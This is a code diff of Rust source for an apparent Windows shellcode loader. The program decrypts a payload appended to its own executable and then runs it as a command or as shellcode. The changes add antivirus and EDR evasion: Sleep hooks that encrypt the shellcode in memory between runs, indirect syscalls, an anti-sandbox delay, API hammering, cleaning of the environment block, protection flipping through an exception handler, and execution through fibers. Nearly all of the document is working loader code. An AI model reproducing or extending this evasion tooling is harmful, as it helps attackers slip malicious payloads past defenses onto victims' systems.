@@ -1,19 +1,22 @@
-#![windows_subsystem = "console"]
+#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
+#![cfg_attr(debug_assertions, windows_subsystem = "console")]
 use aes_gcm::{
     aead::{Aead, KeyInit},
     Aes256Gcm, Nonce,
 };
+use ntapi::ntpebteb::PEB;
 use std::fs;
 use std::io::Read;
 use std::os::windows::process::CommandExt;
 use std::path::PathBuf;
 use std::process::Command;
 use windows_sys::Win32::Foundation::CloseHandle;
-use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
+use windows_sys::Win32::System::Diagnostics::Debug::{
+    AddVectoredExceptionHandler, EXCEPTION_POINTERS, IMAGE_NT_HEADERS64,
+};
 use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
 use windows_sys::Win32::System::Memory::{
-    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
-    PAGE_READWRITE as PAGE_RW,
+    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
 };
 use windows_sys::Win32::System::SystemServices::{
     IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR,
@@ -22,11 +25,14 @@ use windows_sys::Win32::System::SystemServices::{
 use windows_sys::Win32::System::Threading::GetCurrentThreadId;
 
 static mut SLEEP_ORIGINAL: usize = 0;
+static mut SLEEP_EX_ORIGINAL: usize = 0;
 static mut SC_ADDR: usize = 0;
 static mut SC_SIZE: usize = 0;
 static mut SC_THREAD_ID: u32 = 0;
 static mut SSN_PROTECT: u32 = 0;
 static mut ADDR_PROTECT: usize = 0;
+static mut MAIN_FIBER: *mut core::ffi::c_void = core::ptr::null_mut();
+static mut ENC_KEY: u8 = 0;
 
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
@@ -37,26 +43,33 @@ const HASH_NT_WRITE_VIRTUAL_MEMORY: u32 = 0x95f3a792;
 const HASH_NT_PROTECT_VIRTUAL_MEMORY: u32 = 0x082962c8;
 const HASH_NT_CREATE_THREAD_EX: u32 = 0xcb0c2130;
 const HASH_NT_OPEN_PROCESS: u32 = 0x5003c058;
+const HASH_NT_DELAY_EXECUTION: u32 = 0x0a49084a;
 
 const MARKER: &[u8] = b"RSPKv1\0";
 
 #[allow(dead_code)]
 const HASH_KERNEL32: u32 = 0x6DDB9555; // "kernel32.dll" (djb2)
-const HASH_VIRTUAL_ALLOC: u32 = 0x382c0f97;
 #[allow(dead_code)]
 const HASH_VIRTUAL_PROTECT: u32 = 0x844ef7bc;
 #[allow(dead_code)]
 const HASH_CREATE_THREAD: u32 = 0x835e515e;
 #[allow(dead_code)]
 const HASH_WAIT_FOR_SINGLE_OBJECT: u32 = 0x4c6dc63c;
+#[allow(dead_code)]
 const HASH_SLEEP: u32 = 0x0c926a54;
 
-type FnVirtualAlloc = unsafe extern "system" fn(
-    lp_address: *const core::ffi::c_void,
-    dw_size: usize,
-    fl_allocation_type: u32,
-    fl_protect: u32,
-) -> *mut core::ffi::c_void;
+#[allow(dead_code)]
+const HASH_CREATE_THREADPOOL_WORK: u32 = 0x462abfee;
+#[allow(dead_code)]
+const HASH_SUBMIT_THREADPOOL_WORK: u32 = 0x3e07d80e;
+#[allow(dead_code)]
+const HASH_WAIT_FOR_THREADPOOL_WORK_CALLBACKS: u32 = 0x8bc35cd6;
+#[allow(dead_code)]
+const HASH_CLOSE_THREADPOOL_WORK: u32 = 0x6be55f10;
+
+const EXCEPTION_ACCESS_VIOLATION: i32 = 0xC0000005u32 as i32;
+const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
+const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
 
 /*
 type FnVirtualProtect = unsafe extern "system" fn(
@@ -68,19 +81,6 @@ type FnVirtualProtect = unsafe extern "system" fn(
 */
 use windows_sys::Win32::System::Memory::VirtualProtect;
 
-/*
-#[allow(dead_code)]
-type FnCreateThread = unsafe extern "system" fn(
-    lp_thread_attributes: *const core::ffi::c_void,
-    dw_stack_size: usize,
-    lp_start_address: Option<unsafe extern "system" fn(*mut core::ffi::c_void) -> u32>,
-    lp_parameter: *mut core::ffi::c_void,
-    dw_creation_flags: u32,
-    lp_thread_id: *mut u32,
-) -> isize;
-*/
-// windows-sys CreateThread: fn CreateThread(lpthreadattributes: *const SECURITY_ATTRIBUTES, dwstacksize: usize, lpstartaddress: LPTHREAD_START_ROUTINE, lpparameter: *mut c_void, dwcreationflags: u32, lpthreadid: *mut u32) -> HANDLE
-// HANDLE is isize.
 #[allow(dead_code)]
 type FnCreateThread = unsafe extern "system" fn(
     lp_thread_attributes: *const core::ffi::c_void,
@@ -96,6 +96,41 @@ type FnWaitForSingleObject =
     unsafe extern "system" fn(h_handle: isize, dw_milliseconds: u32) -> u32;
 #[allow(dead_code)]
 type FnSleep = unsafe extern "system" fn(dw_milliseconds: u32);
+#[allow(dead_code)]
+type FnSleepEx = unsafe extern "system" fn(dw_milliseconds: u32, b_alertable: i32) -> u32;
+
+#[allow(dead_code)]
+type FnCreateThreadpoolWork = unsafe extern "system" fn(
+    pfnwk: unsafe extern "system" fn(
+        instance: *mut core::ffi::c_void,
+        context: *mut core::ffi::c_void,
+        work: *mut core::ffi::c_void,
+    ),
+    pv: *mut core::ffi::c_void,
+    pcbe: *mut core::ffi::c_void,
+) -> isize;
+
+#[allow(dead_code)]
+type FnSubmitThreadpoolWork = unsafe extern "system" fn(pwk: isize);
+
+#[allow(dead_code)]
+type FnWaitForThreadpoolWorkCallbacks =
+    unsafe extern "system" fn(pwk: isize, fcancelpendingcallbacks: i32);
+
+#[allow(dead_code)]
+type FnCloseThreadpoolWork = unsafe extern "system" fn(pwk: isize);
+
+#[allow(dead_code)]
+type FnConvertThreadToFiber =
+    unsafe extern "system" fn(lp_parameter: *mut core::ffi::c_void) -> *mut core::ffi::c_void;
+#[allow(dead_code)]
+type FnCreateFiber = unsafe extern "system" fn(
+    dw_stack_size: usize,
+    lp_start_address: unsafe extern "system" fn(lp_parameter: *mut core::ffi::c_void),
+    lp_parameter: *mut core::ffi::c_void,
+) -> *mut core::ffi::c_void;
+#[allow(dead_code)]
+type FnSwitchToFiber = unsafe extern "system" fn(lp_fiber: *mut core::ffi::c_void);
 
 // --- Utils ---
 
@@ -122,7 +157,7 @@ unsafe fn get_ntdll_base() -> usize {
         if !name_buf.is_null() {
             let name_slice = core::slice::from_raw_parts(name_buf, (name_len / 2) as usize);
             let s = String::from_utf16_lossy(name_slice);
-            println!("Module: {}", s);
+            // println!("Module: {}", s);
             if s.eq_ignore_ascii_case("ntdll.dll") {
                 return dll_base;
             }
@@ -254,8 +289,6 @@ unsafe fn syscall(
 ) -> i32 {
     0
 }
-
-// --- Obscure Sleep (Removed) ---
 
 #[repr(C)]
 #[allow(non_snake_case)]
@@ -474,30 +507,51 @@ unsafe fn hook_iat(target_dll: &str, target_func: &str, new_func: usize) -> Opti
 
                     if func_str.eq_ignore_ascii_case(target_func) {
                         let original = *thunk as usize;
-
-                        /*
-                                                 // VirtualProtect(thunk as *mut _, 8, PAGE_RW, &mut old_prot);
-                                                 let k32 = get_kernel32_base();
-                                                 let mut old_prot = 0;
-                                                 if k32 != 0 {
-                                                      if let Some(addr) = get_export_addr(k32, HASH_VIRTUAL_PROTECT) {
-                                                          let vp: FnVirtualProtect = core::mem::transmute(addr);
-                                                          vp(thunk as *mut _, 8, PAGE_RW, &mut old_prot);
-                                                      }
-                                                 }
-                                                 *thunk = new_func as u64;
-                                                 // VirtualProtect(thunk as *mut _, 8, old_prot, &mut old_prot);
-                                                  if k32 != 0 {
-                                                      if let Some(addr) = get_export_addr(k32, HASH_VIRTUAL_PROTECT) {
-                                                          let vp: FnVirtualProtect = core::mem::transmute(addr);
-                                                          vp(thunk as *mut _, 8, old_prot, &mut old_prot);
-                                                      }
-                                                 }
-                        */
                         let mut old_prot = 0;
-                        VirtualProtect(thunk as *mut _, 8, PAGE_RW, &mut old_prot);
+                        let mut size = 8usize;
+                        let mut addr = thunk as usize;
+
+                        if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
+                            syscall(
+                                SSN_PROTECT,
+                                ADDR_PROTECT,
+                                -1isize as usize,
+                                &mut addr as *mut _ as usize,
+                                &mut size as *mut _ as usize,
+                                PAGE_READWRITE as usize,
+                                &mut old_prot as *mut _ as usize,
+                                0,
+                                0,
+                                0,
+                                0,
+                                0,
+                                0,
+                            );
+                        } else {
+                            VirtualProtect(thunk as *mut _, 8, PAGE_READWRITE, &mut old_prot);
+                        }
+
                         *thunk = new_func as u64;
-                        VirtualProtect(thunk as *mut _, 8, old_prot, &mut old_prot);
+
+                        if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
+                            syscall(
+                                SSN_PROTECT,
+                                ADDR_PROTECT,
+                                -1isize as usize,
+                                &mut addr as *mut _ as usize,
+                                &mut size as *mut _ as usize,
+                                old_prot as usize,
+                                &mut old_prot as *mut _ as usize,
+                                0,
+                                0,
+                                0,
+                                0,
+                                0,
+                                0,
+                            );
+                        } else {
+                            VirtualProtect(thunk as *mut _, 8, old_prot, &mut old_prot);
+                        }
 
                         return Some(original);
                     }
@@ -511,179 +565,12 @@ unsafe fn hook_iat(target_dll: &str, target_func: &str, new_func: usize) -> Opti
     None
 }
 
-/*
-    // Fallback to GetModuleHandleA if manual parsing fails (or just use it directly for now to fix functionality)
-    // Actually, let's try to fix the manual parsing first.
-    // The previous manual parsing used InMemoryOrderModuleList (offset 0x20).
-    // InMemoryOrder:
-    // LIST_ENTRY InMemoryOrderLinks; // 0x00
-    // ...
-    // PVOID DllBase; // 0x20 in LDR_DATA_TABLE_ENTRY?
-    // Wait, LDR_DATA_TABLE_ENTRY structure:
-    // InLoadOrderLinks (0x00)
-    // InMemoryOrderLinks (0x10)
-    // InInitializationOrderLinks (0x20)
-    // DllBase (0x30)
-    // EntryPoint (0x38)
-    // SizeOfImage (0x40)
-    // FullDllName (0x48)
-    // BaseDllName (0x58)
-
-    // If we iterate InLoadOrderLinks (start at LDR + 0x10), then entry points to LDR_DATA_TABLE_ENTRY directly.
-    // DllBase is at 0x30.
-    // BaseDllName is at 0x58 (UNICODE_STRING).
-
-    // If we iterate InMemoryOrderLinks (start at LDR + 0x20), then entry points to LDR_DATA_TABLE_ENTRY + 0x10.
-    // So DllBase is at (0x30 - 0x10) = 0x20. Correct.
-    // BaseDllName is at (0x58 - 0x10) = 0x48. Correct.
-
-    // So the offsets were correct for InMemoryOrder.
-    // Why did it fail? Maybe case sensitivity or just "kernel32.dll" not found in the list?
-    // It worked for VirtualAlloc (it returned a base).
-    // Wait, "Alloc ptr: 0x..." means VirtualAlloc worked.
-    // So get_kernel32_base() IS WORKING.
-
-    // The issue is VirtualProtect returned 0.
-    // "Protect result: 0"
-    // "Protect failed"
-
-    // Why would VirtualProtect fail?
-    // base is correct. size is correct.
-    // Maybe HASH_VIRTUAL_PROTECT is wrong?
-    // I calculated hashes using djb2 in python:
-    // hex(djb2('VirtualProtect')) -> 0x844ef7bc
-    // My code: const HASH_VIRTUAL_PROTECT: u32 = 0x844ef7bc;
-    // Hash is correct.
-
-    // Maybe calling convention?
-    // type FnVirtualProtect = unsafe extern "system" fn ... -> i32;
-    // "system" is stdcall on x86, C on x64 (Win64). Correct.
-
-    // Maybe GetLastError?
-
-    // Wait, I am using `core::mem::transmute(addr)`.
-    // Maybe `get_export_addr` is returning a valid address?
-    // If VirtualAlloc worked, then `get_export_addr` works for VirtualAlloc.
-
-    // Let's verify the address of VirtualProtect.
-
-    let peb: *const u8;
-    #[cfg(target_arch = "x86_64")]
-    {
-        core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
-    }
-    #[cfg(target_arch = "x86")]
-    {
-        core::arch::asm!("mov {}, fs:[0x30]", out(reg) peb);
-    }
-
-    let ldr = *(peb.add(0x18) as *const *const u8);
-    let mut entry = *(ldr.add(0x20) as *const *const u8); // InMemoryOrderModuleList
-
-    loop {
-        let dll_base = *(entry.add(0x20) as *const usize);
-        let name_len = *(entry.add(0x48) as *const u16);
-        let name_buf = *(entry.add(0x50) as *const *const u16);
-
-        if !name_buf.is_null() {
-            let name_slice = core::slice::from_raw_parts(name_buf, (name_len / 2) as usize);
-            let s = String::from_utf16_lossy(name_slice);
-            if s.eq_ignore_ascii_case("kernel32.dll") {
-                return dll_base;
-            }
-        }
-
-        entry = *(entry as *const *const u8);
-        if entry == *(ldr.add(0x20) as *const *const u8) {
-            break;
-        }
-    }
-    0
-*/
-/*
-    // loop {
-    //     let dll_base = *(entry.add(0x20) as *const usize);
-    //     let name_len = *(entry.add(0x48) as *const u16);
-    //     let name_buf = *(entry.add(0x50) as *const *const u16);
-
-    //     if !name_buf.is_null() {
-    //         let name_slice = core::slice::from_raw_parts(name_buf, (name_len / 2) as usize);
-    //         let s = String::from_utf16_lossy(name_slice);
-    //         if s.eq_ignore_ascii_case("kernel32.dll") {
-    //             return dll_base;
-    //         }
-    //     }
-
-    //     entry = *(entry as *const *const u8);
-    //     if entry == *(ldr.add(0x20) as *const *const u8) {
-    //         break;
-    //     }
-    // }
-    // 0
-    let mut entry = *(ldr.add(0x10) as *const *const u8); // InLoadOrderModuleList
-    loop {
-         let dll_base = *(entry.add(0x30) as *const usize);
-         let name_len = *(entry.add(0x58) as *const u16);
-         let name_buf = *(entry.add(0x60) as *const *const u16);
-
-         if !name_buf.is_null() {
-             let name_slice = core::slice::from_raw_parts(name_buf, (name_len / 2) as usize);
-             let s = String::from_utf16_lossy(name_slice);
-             if s.to_uppercase().contains("KERNEL32.DLL") {
-                 return dll_base;
-             }
-         }
-         entry = *entry;
-         if entry == *(ldr.add(0x10) as *const *const u8) { break; }
-    }
-    0
-*/
 unsafe fn get_kernel32_base() -> usize {
     use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
-    // For now, use GetModuleHandleA directly to ensure functionality.
-    // Manual parsing might be failing due to structure mismatch or offset issues in this environment.
-    // Evasion: GetModuleHandleA is common, but hiding it via manual parsing is better.
-    // However, fixing functionality is priority.
     let h = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
     if h != 0 {
         return h as usize;
     }
-
-    /*
-        // Fallback to manual parsing if GetModuleHandleA returns 0 (unlikely for kernel32)
-        let peb: *const u8;
-        #[cfg(target_arch = "x86_64")]
-        {
-            core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
-        }
-        #[cfg(target_arch = "x86")]
-        {
-            core::arch::asm!("mov {}, fs:[0x30]", out(reg) peb);
-        }
-
-        let ldr = *(peb.add(0x18) as *const *const u8);
-        let mut entry = *(ldr.add(0x20) as *const *const u8); // InMemoryOrderModuleList
-
-        loop {
-            let dll_base = *(entry.add(0x20) as *const usize);
-            let name_len = *(entry.add(0x48) as *const u16);
-            let name_buf = *(entry.add(0x50) as *const *const u16);
-
-            if !name_buf.is_null() {
-                let name_slice = core::slice::from_raw_parts(name_buf, (name_len / 2) as usize);
-                let s = String::from_utf16_lossy(name_slice);
-                if s.eq_ignore_ascii_case("kernel32.dll") {
-                    return dll_base;
-                }
-            }
-
-            entry = *(entry as *const *const u8);
-            if entry == *(ldr.add(0x20) as *const *const u8) {
-                break;
-            }
-        }
-        0
-    */
     0
 }
 
@@ -694,28 +581,33 @@ unsafe extern "system" fn sleep_detour(dw_milliseconds: u32) {
         // RW
         let mut old_prot = 0;
         let base = SC_ADDR as *mut core::ffi::c_void;
-        let size = SC_SIZE;
-        // VirtualProtect(base, size, PAGE_READWRITE, &mut old_prot);
-        // Use dynamic resolution here too if possible, but we are inside hook.
-        // For simplicity/stability inside hook, we can use the resolved pointer if we stored it globally,
-        // or just use the static import (but we want to remove static import).
-        // Let's re-resolve or use a global.
+        let mut size = SC_SIZE;
 
-        /*
-                let k32 = get_kernel32_base();
-                if k32 != 0 {
-                     if let Some(addr) = get_export_addr(k32, HASH_VIRTUAL_PROTECT) {
-                         let vp: FnVirtualProtect = core::mem::transmute(addr);
-                         vp(base, size, PAGE_READWRITE, &mut old_prot);
-                     }
-                }
-        */
-        VirtualProtect(base, size, PAGE_READWRITE, &mut old_prot);
+        if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
+            syscall(
+                SSN_PROTECT,
+                ADDR_PROTECT,
+                0xffffffffffffffff,                      // Current Process (-1)
+                &mut (base as usize) as *mut _ as usize, // *BaseAddress
+                &mut size as *mut _ as usize,            // *RegionSize
+                PAGE_READWRITE as usize,                 // NewProtect
+                &mut old_prot as *mut _ as usize,        // *OldProtect
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+            );
+        } else {
+            VirtualProtect(base, size, PAGE_READWRITE, &mut old_prot);
+        }
 
         // Encrypt
         let slice = core::slice::from_raw_parts_mut(SC_ADDR as *mut u8, SC_SIZE);
+        let key = if ENC_KEY == 0 { 0xAA } else { ENC_KEY };
         for b in slice.iter_mut() {
-            *b ^= 0xAA;
+            *b ^= key;
         }
     }
 
@@ -727,47 +619,352 @@ unsafe extern "system" fn sleep_detour(dw_milliseconds: u32) {
     if do_fluctuation {
         // Decrypt
         let slice = core::slice::from_raw_parts_mut(SC_ADDR as *mut u8, SC_SIZE);
+        let key = if ENC_KEY == 0 { 0xAA } else { ENC_KEY };
         for b in slice.iter_mut() {
-            *b ^= 0xAA;
+            *b ^= key;
         }
 
         // RX/RWX
         let mut old_prot = 0;
         let base = SC_ADDR as *mut core::ffi::c_void;
-        let size = SC_SIZE;
-        /*
-        // VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &mut old_prot);
-        let k32 = get_kernel32_base();
-        if k32 != 0 {
-            if let Some(addr) = get_export_addr(k32, HASH_VIRTUAL_PROTECT) {
-                let vp: FnVirtualProtect = core::mem::transmute(addr);
-                vp(base, size, PAGE_EXECUTE_READWRITE, &mut old_prot);
-            }
+        let mut size = SC_SIZE;
+
+        if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
+            syscall(
+                SSN_PROTECT,
+                ADDR_PROTECT,
+                0xffffffffffffffff,
+                &mut (base as usize) as *mut _ as usize,
+                &mut size as *mut _ as usize,
+                PAGE_EXECUTE_READ as usize,
+                &mut old_prot as *mut _ as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+            );
+        } else {
+            VirtualProtect(base, size, PAGE_EXECUTE_READ, &mut old_prot);
         }
-        */
-        VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &mut old_prot);
     }
 }
 
-/*
-unsafe extern "system" fn thread_wrapper(lp_parameter: *mut core::ffi::c_void) -> u32 {
-    let code: unsafe extern "system" fn() = core::mem::transmute(lp_parameter);
-    code();
-    0
+unsafe extern "system" fn sleep_ex_detour(dw_milliseconds: u32, b_alertable: i32) -> u32 {
+    let do_fluctuation = SC_ADDR != 0 && SC_SIZE != 0 && GetCurrentThreadId() == SC_THREAD_ID;
+
+    if do_fluctuation {
+        let mut old_prot = 0;
+        let base = SC_ADDR as *mut core::ffi::c_void;
+        let mut size = SC_SIZE;
+
+        if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
+            syscall(
+                SSN_PROTECT,
+                ADDR_PROTECT,
+                0xffffffffffffffff,
+                &mut (base as usize) as *mut _ as usize,
+                &mut size as *mut _ as usize,
+                PAGE_READWRITE as usize,
+                &mut old_prot as *mut _ as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+            );
+        } else {
+            VirtualProtect(base, size, PAGE_READWRITE, &mut old_prot);
+        }
+
+        let slice = core::slice::from_raw_parts_mut(SC_ADDR as *mut u8, SC_SIZE);
+        let key = if ENC_KEY == 0 { 0xAA } else { ENC_KEY };
+        for b in slice.iter_mut() {
+            *b ^= key;
+        }
+    }
+
+    let ret = if SLEEP_EX_ORIGINAL != 0 {
+        let original: unsafe extern "system" fn(u32, i32) -> u32 =
+            core::mem::transmute(SLEEP_EX_ORIGINAL);
+        original(dw_milliseconds, b_alertable)
+    } else {
+        0
+    };
+
+    if do_fluctuation {
+        let slice = core::slice::from_raw_parts_mut(SC_ADDR as *mut u8, SC_SIZE);
+        let key = if ENC_KEY == 0 { 0xAA } else { ENC_KEY };
+        for b in slice.iter_mut() {
+            *b ^= key;
+        }
+
+        let mut old_prot = 0;
+        let base = SC_ADDR as *mut core::ffi::c_void;
+        let mut size = SC_SIZE;
+
+        if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
+            syscall(
+                SSN_PROTECT,
+                ADDR_PROTECT,
+                0xffffffffffffffff,
+                &mut (base as usize) as *mut _ as usize,
+                &mut size as *mut _ as usize,
+                PAGE_EXECUTE_READ as usize,
+                &mut old_prot as *mut _ as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+            );
+        } else {
+            VirtualProtect(base, size, PAGE_EXECUTE_READ, &mut old_prot);
+        }
+    }
+    ret
 }
-*/
+
+unsafe fn clean_environment_block() {
+    let peb: *mut PEB;
+    #[cfg(target_arch = "x86_64")]
+    {
+        core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
+    }
+    #[cfg(target_arch = "x86")]
+    {
+        core::arch::asm!("mov {}, fs:[0x30]", out(reg) peb);
+    }
+
+    if peb.is_null() {
+        return;
+    }
+    let params = (*peb).ProcessParameters;
+    if params.is_null() {
+        return;
+    }
+
+    let env = (*params).Environment as *mut u16;
+    if env.is_null() {
+        return;
+    }
+
+    let mut read_ptr = env;
+    let mut write_ptr = env;
+
+    loop {
+        if *read_ptr == 0 {
+            break;
+        }
+
+        let mut len = 0;
+        while *read_ptr.add(len) != 0 {
+            len += 1;
+        }
+
+        let s_slice = core::slice::from_raw_parts(read_ptr, len);
+        let s = String::from_utf16_lossy(s_slice);
+        let key = s.split('=').next().unwrap_or("");
+        let key_upper = key.to_uppercase();
+
+        let keep = matches!(
+            key_upper.as_str(),
+            "SYSTEMROOT"
+                | "SYSTEMDRIVE"
+                | "WINDIR"
+                | "PROGRAMDATA"
+                | "PROGRAMFILES"
+                | "PROGRAMFILES(X86)"
+                | "COMMONPROGRAMFILES"
+                | "COMMONPROGRAMFILES(X86)"
+                | "COMSPEC"
+                | "TEMP"
+                | "TMP"
+                | "USERNAME"
+                | "USERPROFILE"
+                | "ALLUSERSPROFILE"
+                | "APPDATA"
+                | "LOCALAPPDATA"
+                | "PUBLIC"
+        );
+
+        if keep {
+            if read_ptr != write_ptr {
+                core::ptr::copy(read_ptr, write_ptr, len + 1);
+            }
+            write_ptr = write_ptr.add(len + 1);
+        } else if key_upper == "PATH" {
+            let clean_val = "Path=C:\\Windows\\system32;C:\\Windows\0"
+                .encode_utf16()
+                .collect::<Vec<u16>>();
+            if clean_val.len() <= len + 1 {
+                core::ptr::copy_nonoverlapping(clean_val.as_ptr(), write_ptr, clean_val.len());
+                write_ptr = write_ptr.add(clean_val.len());
+            }
+        }
+
+        read_ptr = read_ptr.add(len + 1);
+    }
+
+    *write_ptr = 0;
+    let remaining = (read_ptr as usize).saturating_sub(write_ptr as usize);
+    if remaining > 0 {
+        core::ptr::write_bytes(write_ptr.add(1), 0, remaining / 2);
+    }
+}
+
+#[allow(dead_code)]
+fn api_hammering() {
+    unsafe { clean_environment_block() };
+
+    use windows_sys::Win32::System::Memory::{
+        GetProcessHeap, HeapAlloc, HeapFree, HEAP_ZERO_MEMORY,
+    };
+    use windows_sys::Win32::System::SystemInformation::GetSystemInfo;
+    use windows_sys::Win32::System::SystemInformation::SYSTEM_INFO;
+
+    let heap = unsafe { GetProcessHeap() };
+    for _ in 0..500 {
+        let ptr = unsafe { HeapAlloc(heap, HEAP_ZERO_MEMORY, 1024) };
+        if !ptr.is_null() {
+            unsafe { HeapFree(heap, 0, ptr) };
+        }
+
+        let mut si: SYSTEM_INFO = unsafe { core::mem::zeroed() };
+        unsafe { GetSystemInfo(&mut si) };
+    }
+}
+
+unsafe extern "system" fn veh_guard(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
+    if exception_info.is_null() {
+        return EXCEPTION_CONTINUE_SEARCH;
+    }
+
+    let record = &*(*exception_info).ExceptionRecord;
+    if record.ExceptionCode == EXCEPTION_ACCESS_VIOLATION {
+        let violation_type = record.ExceptionInformation[0]; // 0=Read, 1=Write, 8=Exec
+        let addr = record.ExceptionInformation[1]; // Target Address
+
+        // Check global SC_ADDR/SC_SIZE
+        if SC_ADDR != 0 && SC_SIZE != 0 {
+            let start = SC_ADDR;
+            let end = SC_ADDR + SC_SIZE;
+
+            // Check if address is within shellcode region
+            if addr >= start && addr < end {
+                let mut old = 0;
+                let mut size = SC_SIZE;
+                let base = SC_ADDR as *mut core::ffi::c_void;
+
+                // If it's an Execution Violation (8), it means we are RW/NoAccess, need RX
+                // DEP Violation
+                if violation_type == 8 {
+                    if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
+                        // Syscall Protect RX
+                        syscall(
+                            SSN_PROTECT,
+                            ADDR_PROTECT,
+                            0xffffffffffffffff,
+                            &mut (base as usize) as *mut _ as usize,
+                            &mut size as *mut _ as usize,
+                            PAGE_EXECUTE_READ as usize,
+                            &mut old as *mut _ as usize,
+                            0,
+                            0,
+                            0,
+                            0,
+                            0,
+                            0,
+                        );
+                    } else {
+                        VirtualProtect(base, size, PAGE_EXECUTE_READ, &mut old);
+                    }
+                    return EXCEPTION_CONTINUE_EXECUTION;
+                }
+
+                // If it's a Write Violation (1), it means we are RX, need RW
+                // Self-Modifying Code Support
+                if violation_type == 1 {
+                    if SSN_PROTECT != 0 && ADDR_PROTECT != 0 {
+                        // Syscall Protect RW
+                        syscall(
+                            SSN_PROTECT,
+                            ADDR_PROTECT,
+                            0xffffffffffffffff,
+                            &mut (base as usize) as *mut _ as usize,
+                            &mut size as *mut _ as usize,
+                            PAGE_READWRITE as usize,
+                            &mut old as *mut _ as usize,
+                            0,
+                            0,
+                            0,
+                            0,
+                            0,
+                            0,
+                        );
+                    } else {
+                        VirtualProtect(base, size, PAGE_READWRITE, &mut old);
+                    }
+                    return EXCEPTION_CONTINUE_EXECUTION;
+                }
+            }
+        }
+    }
+    EXCEPTION_CONTINUE_SEARCH
+}
+
+unsafe extern "system" fn fiber_start(param: *mut core::ffi::c_void) {
+    SC_THREAD_ID = GetCurrentThreadId();
+    let code: unsafe extern "system" fn() = core::mem::transmute(param);
+
+    // Global VEH handler (veh_guard) registered in main handles exceptions/execution
+    code();
+
+    // If shellcode returns, switch back to main fiber
+    if !MAIN_FIBER.is_null() {
+        let k32 = get_kernel32_base();
+        if let Some(addr_switch) = get_export_addr(k32, djb2(b"SwitchToFiber")) {
+            let switch: FnSwitchToFiber = core::mem::transmute(addr_switch);
+            switch(MAIN_FIBER);
+        }
+    }
+}
 
 fn main() {
-    // Polymorphism: Random-looking control flow that does nothing
+    api_hammering();
+
+    // Anti-Sandbox: High-precision Delay (NtDelayExecution)
+    let mut interval: i64 = -50_000_000;
+    if let Some((ssn_delay, addr_delay)) = unsafe { get_ssn_indirect(HASH_NT_DELAY_EXECUTION) } {
+        unsafe {
+            syscall(
+                ssn_delay,
+                addr_delay,
+                0,                                // Alertable: FALSE
+                &mut interval as *mut _ as usize, // DelayInterval
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+            );
+        }
+    }
+
     let mut x = 12345u64;
     for _ in 0..100 {
         x = x
             .wrapping_mul(6364136223846793005)
             .wrapping_add(1442695040888963407);
     }
-    if x == 0 {
-        // println!("Polymorphic check");
-    }
+    if x == 0 {}
 
     let exe_path = match std::env::current_exe() {
         Ok(p) => p,
@@ -791,39 +988,33 @@ fn main() {
     println!("Marker found at offset {}", off);
 
     if off + 4 > buf.len() {
-        println!("Truncated key len");
         return;
     }
     let key_len = u32::from_le_bytes(buf[off..off + 4].try_into().unwrap()) as usize;
     off += 4;
     if off + key_len > buf.len() {
-        println!("Truncated key");
         return;
     }
     let key = &buf[off..off + key_len];
     off += key_len;
 
     if off + 4 > buf.len() {
-        println!("Truncated nonce len");
         return;
     }
     let nonce_len = u32::from_le_bytes(buf[off..off + 4].try_into().unwrap()) as usize;
     off += 4;
     if off + nonce_len > buf.len() {
-        println!("Truncated nonce");
         return;
     }
     let nonce_bytes = &buf[off..off + nonce_len];
     off += nonce_len;
 
     if off + 8 > buf.len() {
-        println!("Truncated ct len");
         return;
     }
     let ct_len = u64::from_le_bytes(buf[off..off + 8].try_into().unwrap()) as usize;
     off += 8;
     if off + ct_len > buf.len() {
-        println!("Truncated ciphertext");
         return;
     }
     let ciphertext = &buf[off..off + ct_len];
@@ -855,7 +1046,6 @@ fn main() {
     println!("Decompression success, payload size: {}", payload.len());
 
     if payload.starts_with(b"CMD\0") {
-        println!("Payload type: CMD");
         let cmd = String::from_utf8_lossy(&payload[4..]).to_string();
         let exe_dir = std::env::current_exe()
             .ok()
@@ -923,15 +1113,6 @@ fn main() {
         let sc = &payload[p..p + sc_len];
         println!("SC extracted, len: {}, mode: {}", sc_len, mode);
 
-        // Skip unhooking for now to rule it out
-        // if unhook {
-        //     if let Err(e) = unhook_ntdll() {
-        //         println!("Unhooking failed: {}", e);
-        //     } else {
-        //         println!("Unhooking success");
-        //     }
-        // }
-
         unsafe {
             let ntdll = get_ntdll_base();
             println!("NTDLL Base: {:x}", ntdll);
@@ -965,44 +1146,16 @@ fn main() {
                 }
             } else {
                 let mut base: *mut core::ffi::c_void = core::ptr::null_mut();
-                let mut size = sc_len;
+                // let size = sc_len;
 
-                // Open self to get a real handle
-                // let mut process_handle: isize = 0;
-                // let (ssn_open, addr_open) = get_ssn_indirect(HASH_NT_OPEN_PROCESS).unwrap_or((0x26, 0));
-                // if addr_open != 0 {
-                //     let mut oa: OBJECT_ATTRIBUTES = core::mem::zeroed();
